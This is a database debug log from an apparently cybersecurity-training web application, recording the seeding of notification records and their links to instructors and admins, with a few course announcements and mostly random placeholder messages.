[0m[33m[37.401ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.257','2025-06-09 14:07:58.257',NULL,'EOokPpgbXThjENVeOfOR','system','2025-06-09 14:07:58.257',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.445ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.550ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 99 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[7.862ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:58.295','2025-06-09 14:07:58.295',NULL,1,99) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.925ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.302','2025-06-09 14:07:58.302',NULL,'UeSiMKpzECroqBlFYVKT','system','2025-06-09 14:07:58.302',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.534ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.567ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 100 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[15.880ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:58.311','2025-06-09 14:07:58.311',NULL,1,100) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[8.339ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.327','2025-06-09 14:07:58.327',NULL,'AalxGhZouDcCyHRJsQvV','system','2025-06-09 14:07:58.327',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.470ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.514ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 101 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[8.686ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:58.335','2025-06-09 14:07:58.335',NULL,1,101) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.312ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.342','2025-06-09 14:07:58.342',NULL,'ejzngevAvRNjEskJzIyJ','system','2025-06-09 14:07:58.342',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.634ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.719ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 102 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[11.531ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:58.354','2025-06-09 14:07:58.354',NULL,1,102) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.903ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.361','2025-06-09 14:07:58.361',NULL,'zinMnhQUzLgWZYhJCFmd','system','2025-06-09 14:07:58.36',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.509ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.617ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 103 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[7.519ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:58.37','2025-06-09 14:07:58.37',NULL,1,103) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.055ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.376','2025-06-09 14:07:58.376',NULL,'UUTlEoYEiKMYVDiSNLTM','system','2025-06-09 14:07:58.376',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.510ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.604ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 104 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[9.211ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:58.383','2025-06-09 14:07:58.383',NULL,1,104) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.996ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.392','2025-06-09 14:07:58.392',NULL,'OFcFFIGxELMNppeiCcFT','system','2025-06-09 14:07:58.392',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.586ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.626ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 105 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[13.460ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:58.401','2025-06-09 14:07:58.401',NULL,1,105) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.037ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.413','2025-06-09 14:07:58.413',NULL,'New machine ''SQL Injection Basics'' has been added to Web Security course','announcement','2025-06-09 14:07:58.413',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.086ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.593ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 106 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[11.185ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.421','2025-06-09 14:07:58.421',NULL,1,106) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[9.239ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.434','2025-06-09 14:07:58.434',NULL,'Reminder: Complete the ''Buffer Overflow'' challenge b','reminder','2025-06-09 14:07:58.434',true) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.666ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.599ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 107 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[9.011ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.441','2025-06-09 14:07:58.441',NULL,1,107) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.007ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.449','2025-06-09 14:07:58.449',NULL,'System maintenance scheduled for Saturday, May 25th from 2-4 AM UTC','system','2025-06-09 14:07:58.449',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.655ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.615ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 108 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[15.189ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.457','2025-06-09 14:07:58.457',NULL,1,108) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.919ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.471','2025-06-09 14:07:58.471',NULL,'Congratulations to the top 3 students on the leaderboard this month!','announcement','2025-06-09 14:07:58.47',true) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.610ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.551ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 109 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[9.561ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.478','2025-06-09 14:07:58.478',NULL,1,109) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[10.033ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.49','2025-06-09 14:07:58.49',NULL,'New course ''Advanced Network Security'' is now available','reminder','2025-06-09 14:07:58.49',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.718ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.663ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 110 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.081ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.498','2025-06-09 14:07:58.498',NULL,1,110) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.737ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.505','2025-06-09 14:07:58.505',NULL,'ZGtTAQLCUjOSyYwCAFlJ','system','2025-06-09 14:07:58.504',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.624ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.542ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 111 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.391ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.515','2025-06-09 14:07:58.515',NULL,1,111) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.044ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.521','2025-06-09 14:07:58.521',NULL,'HGpAAPchotXDpwpQzZdx','system','2025-06-09 14:07:58.521',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.372ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.541ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 112 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[15.705ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.535','2025-06-09 14:07:58.535',NULL,1,112) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.646ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.543','2025-06-09 14:07:58.543',NULL,'uRoClUJVCaHZSLMypiXZ','system','2025-06-09 14:07:58.543',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.508ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.555ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 113 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.747ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.552','2025-06-09 14:07:58.552',NULL,1,113) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.015ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.56','2025-06-09 14:07:58.56',NULL,'FjWZtkMuZGzDhGYIrDXA','system','2025-06-09 14:07:58.559',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.519ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.579ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 114 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[13.953ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.57','2025-06-09 14:07:58.57',NULL,1,114) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.045ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.58','2025-06-09 14:07:58.58',NULL,'QBnzkXkpHhviTzBmMifc','system','2025-06-09 14:07:58.58',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.432ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.586ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 115 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.558ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.587','2025-06-09 14:07:58.587',NULL,1,115) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.917ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.594','2025-06-09 14:07:58.594',NULL,'aaCXcdqRlhJOkSzpVIZs','system','2025-06-09 14:07:58.594',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.551ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.661ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 116 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[9.612ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.603','2025-06-09 14:07:58.603',NULL,1,116) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.534ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.612','2025-06-09 14:07:58.612',NULL,'RJEmZlkNUwXMlnhZCTsI','system','2025-06-09 14:07:58.612',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.557ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.617ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 117 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[10.035ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:07:58.62','2025-06-09 14:07:58.62',NULL,1,117) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.369ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:58.628','2025-06-09 14:07:58.628',NULL,'QDOwPFCzfixCDcYZkXay','system','2025-06-09 14:07:58.628',false) RETURNING "id"

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.465ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.531ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 118 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:58 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
